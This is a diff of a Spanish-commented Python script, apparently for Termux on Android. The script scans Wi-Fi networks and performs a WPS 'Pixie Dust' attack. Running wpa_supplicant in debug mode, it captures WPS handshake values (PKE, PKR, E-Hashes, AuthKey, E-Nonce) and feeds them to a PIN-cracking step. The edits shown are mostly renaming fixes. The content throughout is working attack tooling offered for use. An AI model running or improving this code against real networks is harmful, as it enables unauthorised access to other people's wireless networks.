@@ -2,6 +2,7 @@ import subprocess
 import re
 import os
 import time
+import tempfile
 from tabulate import tabulate
 
 def run_command(command, use_sudo=False):
@@ -58,10 +59,10 @@ def scan_wifi(interface):
     return redes, bssids, canales, intensidades
 
 def create_wpa_supplicant_conf(ssid):
-    """Crea un archivo de configuración temporal para wpa-supplicant"""
+    """Crea un archivo de configuración temporal para wpa_supplicant"""
     conf_content = f"""
 network={{
-    ssid=\"{ssid}\"
+    ssid="{ssid}"
     key_mgmt=NONE
 }}
 """
@@ -71,15 +72,15 @@ network={{
     return conf_file.name
 
 def capture_wps_data(interface, ssid):
-    """Captura los datos necesarios para el ataque Pixie Dust usando wpa-supplicant"""
+    """Captura los datos necesarios para el ataque Pixie Dust usando wpa_supplicant"""
     print(f"Capturando datos WPS de la red con SSID {ssid}...")
     conf_file = create_wpa_supplicant_conf(ssid)
-    wpa_supplicant_path = "/data/data/com.termux/files/usr/bin/wpa-supplicant"  # Ruta completa de wpa-supplicant
+    wpa_supplicant_path = "/data/data/com.termux/files/usr/bin/wpa_supplicant"  # Ruta completa de wpa_supplicant
     wpa_supplicant_command = f"{wpa_supplicant_path} -i {interface} -c {conf_file} -dd"
-    print(f"Ejecutando wpa-supplicant: {wpa_supplicant_command}")
+    print(f"Ejecutando wpa_supplicant: {wpa_supplicant_command}")
     stdout, stderr = run_command(wpa_supplicant_command, use_sudo=True)
 
-    print("Salida de wpa-supplicant:")
+    print("Salida de wpa_supplicant:")
     print(stdout)
     print(stderr)
 
@@ -99,10 +100,10 @@ def capture_wps_data(interface, ssid):
     return pke, pkr, ehash1, ehash2, authkey, enonce
 
 def perform_pixie_dust_attack(interface, ssid):
-    """Realiza el ataque Pixie Dust usando los datos de wpa-supplicant."""
+    """Realiza el ataque Pixie Dust usando los datos de wpa_supplicant."""
     print(f"\nIniciando ataque Pixie Dust en SSID: {ssid}")
 
-    # Capturar los datos necesarios usando wpa-supplicant
+    # Capturar los datos necesarios usando wpa_supplicant
     pke, pkr, ehash1, ehash2, authkey, enonce = capture_wps_data(interface, ssid)
     if not all([pke, pkr, ehash1, ehash2, authkey, enonce]):
         print("No se pudieron capturar los datos necesarios para el ataque Pixie Dust.")
@@ -118,7 +119,6 @@ def perform_pixie_dust_attack(interface, ssid):
         if output == b'' and process.poll() is not None:
             break
         if output:
-            os.system('clear')
             print(output.strip().decode())
         time.sleep(0.1)
 
@@ -147,7 +147,7 @@ def main():
     os.system('clear')
 
     # Verificar la disponibilidad de las herramientas necesarias
-    tools = ["iw", "/data/data/com.termux/files/usr/bin/wpa-supplicant"]
+    tools = ["iw", "wpa_supplicant"]
     for tool in tools:
         if not check_tool_availability(tool):
             print(f"Error: {tool} no está disponible en el sistema.")
